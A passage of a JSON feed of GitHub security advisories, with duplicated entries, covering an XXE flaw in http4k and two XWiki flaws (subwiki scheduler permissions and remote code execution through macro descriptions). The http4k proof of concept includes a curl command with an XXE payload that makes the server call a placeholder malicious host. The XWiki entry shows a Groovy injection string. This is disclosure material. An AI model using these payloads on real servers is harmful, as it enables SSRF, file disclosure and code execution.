href=\"https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46\">https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55875\">https://nvd.nist.gov/vuln/detail/CVE-2024-55875</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mj5-hjjj-8rgw\">https://github.com/advisories/GHSA-7mj5-hjjj-8rgw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mj5-hjjj-8rgw",
            "title": "[org.http4k:http4k-format-xml] http4k has a potential XXE (XML External Entity Injection) vulnerability",
            "date_modified": "2024-12-12T22:31:41.000Z",
            "date_published": "2024-12-12T19:22:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mj5-hjjj-8rgw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><em>Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server.</em></p>\n<p>There is a potential XXE(XML External Entity Injection) vulnerability when http4k handling malicious XML contents within requests, which might allow attackers to read local sensitive information on server, trigger Server-side Request Forgery and even execute code under some circumstances.</p>\n<h3 id=\"details\">Details</h3>\n<p><em>Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.</em>\n<a href=\"https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46\">https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46</a>\nXML contents is parsed with DocumentBuilder without security settings on or external entity enabled</p>\n<h3 id=\"poc\">PoC</h3>\n<p><em>Complete instructions, including specific configuration details, to reproduce the vulnerability.</em></p>\n<h4 id=\"example-vulnerable-server-code\">Example Vulnerable server code:</h4>\n<pre><code>import org.http4k.core.*\nimport org.http4k.format.Xml.xml\nimport org.http4k.server.Netty\nimport org.http4k.server.asServer\nimport org.w3c.dom.Document\n\nfun main() {\n\n    val xmlLens = Body.xml().toLens()\n\n    // Create an HTTP handler\n    val app: HttpHandler = { request -&gt;\n        try {\n            // Parse the incoming XML payload to a Document object\n            val xmlDocument: Document = xmlLens(request)\n\n            // Extract root element name or other details from the XML\n            val rootElementName = xmlDocument.documentElement.nodeName\n\n            // Create a response XML based on the extracted information\n            val responseXml = \"\"\"\n                &lt;response&gt;\n                    &lt;message&gt;Root element is: $rootElementName&lt;/message&gt;\n                &lt;/response&gt;\n            \"\"\".trimIndent()\n\n            // Respond with XML\n            Response(Status.OK).body(responseXml).header(\"Content-Type\", \"application/xml\")\n        } catch (e: Exception) {\n            // Handle invalid XML or other errors\n            Response(Status.BAD_REQUEST).body(\"Invalid XML: ${e.message}\")\n        }\n    }\n\n    // Start the server\n    val server = app.asServer(Netty(9000)).start()\n    println(\"Server started on http://localhost:9000\")\n}\n</code></pre>\n<h4 id=\"maven-dependency\">Maven dependency:</h4>\n<pre><code>&lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;\n            &lt;artifactId&gt;kotlin-test-junit5&lt;/artifactId&gt;\n            &lt;version&gt;1.9.0&lt;/version&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;\n            &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;\n            &lt;version&gt;5.10.0&lt;/version&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;\n            &lt;artifactId&gt;kotlin-stdlib&lt;/artifactId&gt;\n            &lt;version&gt;1.9.0&lt;/version&gt;\n        &lt;/dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.http4k&lt;/groupId&gt;\n            &lt;artifactId&gt;http4k-core&lt;/artifactId&gt;\n            &lt;version&gt;5.40.0.0&lt;/version&gt;\n        &lt;/dependency&gt;\n\n        &lt;!-- Http4k XML format --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.http4k&lt;/groupId&gt;\n            &lt;artifactId&gt;http4k-format-xml&lt;/artifactId&gt;\n            &lt;version&gt;5.40.0.0&lt;/version&gt;\n        &lt;/dependency&gt;\n\n        &lt;!-- http4k Netty --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.http4k&lt;/groupId&gt;\n            &lt;artifactId&gt;http4k-server-netty&lt;/artifactId&gt;\n            &lt;version&gt;5.40.0.0&lt;/version&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n</code></pre>\n<h4 id=\"exploit-payload-example-to-trigger-ssrf\">Exploit payload example to trigger SSRF</h4>\n<p><code>curl -X POST http://localhost:9000 -H \"Content-Type: application/xml\" -d \"&lt;?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \\\"https://replace.with.your.malicious.website/poc\\\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;\"</code></p>\n<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em>\nThe servers that employ this XML parsing feature of http4k are vulnerable to this XXE vulnerability</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw\">https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw</a></li>\n<li><a href=\"https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc\">https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc</a></li>\n<li><a href=\"https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46\">https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55875\">https://nvd.nist.gov/vuln/detail/CVE-2024-55875</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mj5-hjjj-8rgw\">https://github.com/advisories/GHSA-7mj5-hjjj-8rgw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mj5-hjjj-8rgw",
            "title": "[org.http4k:http4k-format-xml] http4k has a potential XXE (XML External Entity Injection) vulnerability",
            "date_modified": "2024-12-12T22:31:41.000Z",
            "date_published": "2024-12-12T19:22:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mj5-hjjj-8rgw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Any user with an account on the main wiki could run scheduling operations on subwikis.\nTo reproduce, as a user on the main wiki without any special right, view the document <code>Scheduler.WebHome</code> in a subwiki. Then, click on any operation (<em>e.g.,</em> Trigger) on any job. If the operation is successful, then the instance is vulnerable.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been patched in XWiki 15.10.9 and 16.3.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you have subwikis where the Job Scheduler is enabled, you can edit the objects on <code>Scheduler.WebPreferences</code> to match <a href=\"https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331#diff-8e274bd0065e319a34090339de6dfe56193144d15fd71c52c1be7272254728b4\">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331#diff-8e274bd0065e319a34090339de6dfe56193144d15fd71c52c1be7272254728b4</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-21663\">https://jira.xwiki.org/browse/XWIKI-21663</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331\">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://jira.xwiki.org/\">Jira XWiki.org</a></li>\n<li>Email us at <a href=\"mailto:security@xwiki.org\">Security Mailing List</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-cwq6-mjmx-47p6\">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-cwq6-mjmx-47p6</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331\">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331</a></li>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-21663\">https://jira.xwiki.org/browse/XWIKI-21663</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55876\">https://nvd.nist.gov/vuln/detail/CVE-2024-55876</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cwq6-mjmx-47p6\">https://github.com/advisories/GHSA-cwq6-mjmx-47p6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cwq6-mjmx-47p6",
            "title": "[org.xwiki.platform:xwiki-platform-scheduler-ui] XWiki's scheduler in subwiki allows scheduling operations for any main wiki user",
            "date_modified": "2024-12-12T22:31:49.000Z",
            "date_published": "2024-12-12T19:21:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cwq6-mjmx-47p6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Any user with an account on the main wiki could run scheduling operations on subwikis.\nTo reproduce, as a user on the main wiki without any special right, view the document <code>Scheduler.WebHome</code> in a subwiki. Then, click on any operation (<em>e.g.,</em> Trigger) on any job. If the operation is successful, then the instance is vulnerable.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been patched in XWiki 15.10.9 and 16.3.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you have subwikis where the Job Scheduler is enabled, you can edit the objects on <code>Scheduler.WebPreferences</code> to match <a href=\"https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331#diff-8e274bd0065e319a34090339de6dfe56193144d15fd71c52c1be7272254728b4\">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331#diff-8e274bd0065e319a34090339de6dfe56193144d15fd71c52c1be7272254728b4</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-21663\">https://jira.xwiki.org/browse/XWIKI-21663</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331\">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://jira.xwiki.org/\">Jira XWiki.org</a></li>\n<li>Email us at <a href=\"mailto:security@xwiki.org\">Security Mailing List</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-cwq6-mjmx-47p6\">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-cwq6-mjmx-47p6</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331\">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331</a></li>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-21663\">https://jira.xwiki.org/browse/XWIKI-21663</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55876\">https://nvd.nist.gov/vuln/detail/CVE-2024-55876</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cwq6-mjmx-47p6\">https://github.com/advisories/GHSA-cwq6-mjmx-47p6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cwq6-mjmx-47p6",
            "title": "[org.xwiki.platform:xwiki-platform-scheduler-ui] XWiki's scheduler in subwiki allows scheduling operations for any main wiki user",
            "date_modified": "2024-12-12T22:31:49.000Z",
            "date_published": "2024-12-12T19:21:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cwq6-mjmx-47p6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Any user with an account can perform arbitrary remote code execution by adding instances of <code>XWiki.WikiMacroClass</code> to any page. This compromises the confidentiality, integrity and availability of the whole XWiki installation.</p>\n<p>To reproduce on a instance, as a connected user without script nor programming rights, go to your user profile and add an object of type <code>XWiki.WikiMacroClass</code>. Set \"Macro Id\", \"Macro Name\" and \"Macro Code\" to any value, \"Macro Visibility\" to <code>Current User</code> and \"Macro Description\" to <code>{{async}}{{groovy}}println(\"Hello from User macro!\"){{/groovy}}{{/async}}</code>.\nSave the page, then go to <code>&lt;host&gt;/xwiki/bin/view/XWiki/XWikiSyntaxMacrosList</code>.\nIf the description of your new macro reads \"Hello from User macro!\", then your instance is vulnerable.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been fixed in XWiki 15.10.11, 16.4.1 and 16.5.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It is possible to manually apply <a href=\"https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3#diff-92fee29683e671b8bc668e3cf4295713d6259f715e3954876049f9de77c0a9ef\">this patch</a> to the page <code>XWiki.XWikiSyntaxMacrosList</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-22030\">https://jira.xwiki.org/browse/XWIKI-22030</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3\">https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2r87-74cx-2p7c\">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2r87-74cx-2p7c</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3\">https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3</a></li>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-22030\">https://jira.xwiki.org/browse/XWIKI-22030</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55877\">https://nvd.nist.gov/vuln/detail/CVE-2024-55877</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2r87-74cx-2p7c\">https://github.com/advisories/GHSA-2r87-74cx-2p7c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2r87-74cx-2p7c",
            "title": "[org.xwiki.platform:xwiki-platform-help-ui] XWiki allows remote code execution from account through macro descriptions and XWiki.XWikiSyntaxMacrosList",
            "date_modified": "2024-12-12T22:33:09.000Z",
            "date_published": "2024-12-12T19:21:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2r87-74cx-2p7c"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}